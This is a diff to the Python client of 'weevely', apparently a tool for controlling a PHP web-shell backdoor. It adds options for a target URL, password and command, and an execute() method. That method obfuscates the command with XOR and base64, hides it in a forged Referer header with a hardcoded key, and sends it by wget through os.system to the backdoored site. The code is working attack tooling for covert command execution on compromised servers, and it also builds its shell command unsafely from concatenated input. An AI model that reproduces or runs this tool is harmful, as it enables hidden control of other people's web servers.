@@ -22,24 +22,33 @@ switch($ref[2]){
 
 
 class weevely:
-  
   def main(self):
     #self.generate()
+  
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'g:', ['generate'])
+	opts, args = getopt.getopt(sys.argv[1:], 'g:u:p:e:', ['generate', 'url', 'password', 'exec'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
 
-    print args
-    ## process options
+    # process options
     for o, a in opts:
-	if o in ("g", "generate"):
-	    print "AAMKJHLHJAHNO"
+	if o in ("-g", "-generate"):
+	  print "+ generating backdoor code in", a
+	if o in ("-u", "-url"):
+	  url=a
+	if o in ("-p", "-password"):
+	  pwd=a
+	if o in ("-e", "-exec"):
+	  cmnd=a
+	  mode=0
 	else:
-	 print ""
+	  print "+ wrong options"
 	    
-	    
+	   
+    if cmnd: 
+      self.execute(url,pwd,cmnd,mode)
+     
   def crypt(self, text, key):
     #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
     text = frombuffer( text, dtype=byte )
@@ -50,9 +59,11 @@ class weevely:
     toret = base64.b64encode(( (text ^ firstpad) & strrepeat ) | ( text & strrepeat2 ))
     return toret 
 
-  def generate(self):
-    cmdstr=self.crypt("http://www.google.it a/culo.html","c4m4ll0")
-    wgetstr='wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=1" http://192.168.1.102/ -O - -q'
+  def execute(self, url, pwd, cmnd, mode):
+    print "+ execute command", cmnd, url, pwd
+    cmdstr=self.crypt(cmnd,pwd)
+    wgetstr='wget --referer "http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=' + str(mode) + '" ' + url + ' -O - -q'
+    print wgetstr
     os.system(wgetstr)
     
 
